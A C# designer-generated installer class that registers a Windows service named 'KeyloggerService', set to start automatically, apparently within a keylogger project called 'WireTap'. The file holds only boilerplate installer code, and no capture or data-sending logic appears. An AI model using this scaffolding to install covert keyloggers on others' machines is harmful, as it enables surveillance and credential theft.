namespace WireTap.WiindowsService2
{
    partial class ProjectInstaller
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary> 
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Component Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.WireTapInstaller = new System.ServiceProcess.ServiceProcessInstaller();
            this.KeyloggerServiceInstaller = new System.ServiceProcess.ServiceInstaller();
            // 
            // WireTapInstaller
            // 
            this.WireTapInstaller.Password = null;
            this.WireTapInstaller.Username = null;
            // 
            // KeyloggerServiceInstaller
            // 
            this.KeyloggerServiceInstaller.ServiceName = "KeyloggerService";
            this.KeyloggerServiceInstaller.StartType = System.ServiceProcess.ServiceStartMode.Automatic;
            // 
            // ProjectInstaller
            // 
            this.Installers.AddRange(new System.Configuration.Install.Installer[] {
            this.WireTapInstaller,
            this.KeyloggerServiceInstaller});

        }

        #endregion

        private System.ServiceProcess.ServiceProcessInstaller WireTapInstaller;
        private System.ServiceProcess.ServiceInstaller KeyloggerServiceInstaller;
    }
}